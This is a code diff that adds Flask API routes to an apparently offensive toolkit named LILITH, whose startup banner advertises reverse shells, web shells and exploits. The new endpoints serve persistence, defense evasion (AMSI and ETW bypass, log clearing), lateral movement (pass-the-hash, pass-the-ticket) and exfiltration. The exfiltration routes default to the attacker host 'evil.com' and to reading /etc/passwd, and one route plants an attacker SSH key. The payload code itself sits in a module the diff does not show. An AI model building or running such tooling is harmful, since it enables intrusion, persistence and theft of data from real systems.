@@ -3891,6 +3891,279 @@ def delete_attack_log(attack_id: str):
         return jsonify({'success': False, 'error': str(e)})
 
 
+# =============================================================================
+# ADVANCED ATTACK MODULES - Persistence, Evasion, Lateral Movement, Exfiltration
+# =============================================================================
+
+@app.route('/advanced/persistence', methods=['POST'])
+def get_persistence_techniques():
+    """Get persistence techniques"""
+    try:
+        from lilith_advanced_attacks import get_advanced_attack_module
+        
+        data = request.json or {}
+        lhost = data.get('lhost', '10.10.10.10')
+        lport = int(data.get('lport', 4444))
+        os_type = data.get('os', 'all')  # linux, windows, all
+        
+        module = get_advanced_attack_module()
+        all_techniques = module.get_all_persistence_techniques(lhost, lport)
+        
+        if os_type == 'linux':
+            techniques = {'linux': all_techniques['linux']}
+        elif os_type == 'windows':
+            techniques = {'windows': all_techniques['windows']}
+        else:
+            techniques = all_techniques
+        
+        return jsonify({
+            'success': True,
+            'lhost': lhost,
+            'lport': lport,
+            'techniques': techniques,
+            'technique_count': sum(len(t) for t in techniques.values())
+        })
+    except Exception as e:
+        import traceback
+        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})
+
+
+@app.route('/advanced/persistence/<technique>', methods=['POST'])
+def get_specific_persistence(technique: str):
+    """Get specific persistence technique"""
+    try:
+        from lilith_advanced_attacks import PersistenceModule
+        
+        data = request.json or {}
+        lhost = data.get('lhost', '10.10.10.10')
+        lport = int(data.get('lport', 4444))
+        
+        pm = PersistenceModule()
+        
+        technique_map = {
+            'cron': pm.linux_cron_persistence,
+            'ssh': lambda l, p: pm.linux_ssh_persistence("ssh-rsa AAAA... attacker@evil"),
+            'bashrc': pm.linux_bashrc_persistence,
+            'systemd': pm.linux_systemd_persistence,
+            'init': pm.linux_init_persistence,
+            'ld_preload': pm.linux_ld_preload_persistence,
+            'registry': pm.windows_registry_persistence,
+            'scheduled_task': pm.windows_scheduled_task_persistence,
+            'wmi': pm.windows_wmi_persistence
+        }
+        
+        if technique not in technique_map:
+            return jsonify({
+                'success': False,
+                'error': f'Unknown technique: {technique}',
+                'available': list(technique_map.keys())
+            })
+        
+        result = technique_map[technique](lhost, lport)
+        
+        return jsonify({
+            'success': True,
+            'technique': technique,
+            **result
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/evasion', methods=['GET'])
+def get_evasion_techniques():
+    """Get all defense evasion techniques"""
+    try:
+        from lilith_advanced_attacks import get_advanced_attack_module
+        
+        os_type = request.args.get('os', 'all')
+        module = get_advanced_attack_module()
+        all_techniques = module.get_all_evasion_techniques()
+        
+        if os_type == 'linux':
+            techniques = {'linux': all_techniques['linux']}
+        elif os_type == 'windows':
+            techniques = {'windows': all_techniques['windows']}
+        else:
+            techniques = all_techniques
+        
+        return jsonify({
+            'success': True,
+            'techniques': techniques
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/evasion/<technique>', methods=['GET'])
+def get_specific_evasion(technique: str):
+    """Get specific evasion technique"""
+    try:
+        from lilith_advanced_attacks import DefenseEvasionModule
+        
+        dm = DefenseEvasionModule()
+        
+        technique_map = {
+            'linux_logs': dm.linux_log_clearing,
+            'linux_process_hide': dm.linux_process_hiding,
+            'amsi_bypass': dm.windows_amsi_bypass,
+            'defender_evasion': dm.windows_defender_evasion,
+            'etw_bypass': dm.windows_etw_bypass,
+            'windows_logs': dm.windows_log_clearing,
+            'obfuscation': dm.obfuscation_techniques
+        }
+        
+        if technique not in technique_map:
+            return jsonify({
+                'success': False,
+                'error': f'Unknown technique: {technique}',
+                'available': list(technique_map.keys())
+            })
+        
+        result = technique_map[technique]()
+        
+        return jsonify({
+            'success': True,
+            'technique': technique,
+            **result
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/lateral', methods=['POST'])
+def get_lateral_movement():
+    """Get lateral movement techniques"""
+    try:
+        from lilith_advanced_attacks import get_advanced_attack_module
+        
+        data = request.json or {}
+        target = data.get('target', '192.168.1.100')
+        username = data.get('username', 'administrator')
+        password = data.get('password', 'password')
+        
+        module = get_advanced_attack_module()
+        techniques = module.get_all_lateral_techniques(target, username, password)
+        
+        return jsonify({
+            'success': True,
+            'target': target,
+            'techniques': techniques,
+            'technique_count': len(techniques)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/lateral/<technique>', methods=['POST'])
+def get_specific_lateral(technique: str):
+    """Get specific lateral movement technique"""
+    try:
+        from lilith_advanced_attacks import LateralMovementModule
+        
+        data = request.json or {}
+        target = data.get('target', '192.168.1.100')
+        username = data.get('username', 'administrator')
+        password = data.get('password', 'password')
+        ntlm_hash = data.get('hash', '')
+        
+        lm = LateralMovementModule()
+        
+        technique_map = {
+            'ssh': lambda: lm.ssh_lateral_movement(target, username, password),
+            'smb': lambda: lm.smb_lateral_movement(target, username, password, ntlm_hash if ntlm_hash else None),
+            'winrm': lambda: lm.winrm_lateral_movement(target, username, password),
+            'rdp': lambda: lm.rdp_lateral_movement(target, username, password),
+            'wmi': lambda: lm.wmi_lateral_movement(target, username, password),
+            'pth': lambda: lm.pass_the_hash(target, username, ntlm_hash or 'HASH_HERE'),
+            'ptt': lambda: lm.pass_the_ticket(target, data.get('ticket', 'ticket.kirbi')),
+            'pivot': lambda: lm.network_pivoting(target, data.get('target_network', '10.0.0.0'))
+        }
+        
+        if technique not in technique_map:
+            return jsonify({
+                'success': False,
+                'error': f'Unknown technique: {technique}',
+                'available': list(technique_map.keys())
+            })
+        
+        result = technique_map[technique]()
+        
+        return jsonify({
+            'success': True,
+            'technique': technique,
+            **result
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/exfil', methods=['POST'])
+def get_exfiltration_techniques():
+    """Get exfiltration techniques"""
+    try:
+        from lilith_advanced_attacks import get_advanced_attack_module
+        
+        data = request.json or {}
+        exfil_server = data.get('server', 'evil.com')
+        
+        module = get_advanced_attack_module()
+        techniques = module.get_all_exfil_techniques(exfil_server)
+        
+        return jsonify({
+            'success': True,
+            'exfil_server': exfil_server,
+            'techniques': techniques,
+            'technique_count': len(techniques)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+@app.route('/advanced/exfil/<technique>', methods=['POST'])
+def get_specific_exfil(technique: str):
+    """Get specific exfiltration technique"""
+    try:
+        from lilith_advanced_attacks import ExfiltrationModule
+        
+        data = request.json or {}
+        exfil_server = data.get('server', 'evil.com')
+        data_to_exfil = data.get('data', 'sample_sensitive_data')
+        data_path = data.get('path', '/etc/passwd')
+        
+        em = ExfiltrationModule()
+        
+        technique_map = {
+            'http': lambda: em.http_exfiltration(data_to_exfil, exfil_server),
+            'https': lambda: em.https_exfiltration(data_to_exfil, exfil_server),
+            'dns': lambda: em.dns_exfiltration(data_to_exfil, exfil_server),
+            'icmp': lambda: em.icmp_exfiltration(data_to_exfil, exfil_server),
+            'smb': lambda: em.smb_exfiltration(data_path, exfil_server),
+            'ftp': lambda: em.ftp_exfiltration(data_path, exfil_server),
+            'cloud': lambda: em.cloud_exfiltration(data_path),
+            'stego': lambda: em.steganography_exfiltration(data_path, data.get('image', 'cover.jpg'), 'output.jpg'),
+            'archive': lambda: em.archive_and_encrypt(data_path, '/tmp/exfil', data.get('password', 'infected')),
+            'staging': lambda: em.data_staging()
+        }
+        
+        if technique not in technique_map:
+            return jsonify({
+                'success': False,
+                'error': f'Unknown technique: {technique}',
+                'available': list(technique_map.keys())
+            })
+        
+        result = technique_map[technique]()
+        
+        return jsonify({
+            'success': True,
+            'technique': technique,
+            **result
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
 if __name__ == '__main__':
     # Get host from environment or use 0.0.0.0 to be accessible externally
     host = os.environ.get('BACKEND_HOST', '0.0.0.0')
@@ -3903,5 +4176,6 @@ if __name__ == '__main__':
     print(f"[LILITH] REAL Hacking Code Generator: Reverse Shells, Web Shells, Exploits")
     print(f"[LILITH] Shrek Payload Generator: 35+ reverse shell types")
     print(f"[LILITH] Attack History Logger: MongoDB-backed logging")
+    print(f"[LILITH] Advanced Attack Modules: Persistence, Evasion, Lateral, Exfiltration")
     
     app.run(host=host, port=port, debug=False)
